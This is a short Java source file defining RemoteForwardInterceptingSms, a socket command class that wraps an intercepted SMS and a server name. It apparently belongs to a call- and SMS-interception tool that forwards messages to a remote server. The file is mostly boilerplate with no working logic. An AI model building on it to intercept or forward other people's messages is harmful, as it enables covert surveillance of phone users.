package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.InterceptingSms;

public class RemoteForwardInterceptingSms extends SocketCmd<InterceptingSms, Boolean> {
	
	private static final long serialVersionUID = 5363611678192822520L;
	
	private static final String TAG = "RemoteForwardInterceptingSms";
	private String mServerName;

	public RemoteForwardInterceptingSms(InterceptingSms interceptingSms, String serverName) {
		super(interceptingSms, Boolean.class);
		mServerName = serverName;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return mServerName;
	}

}
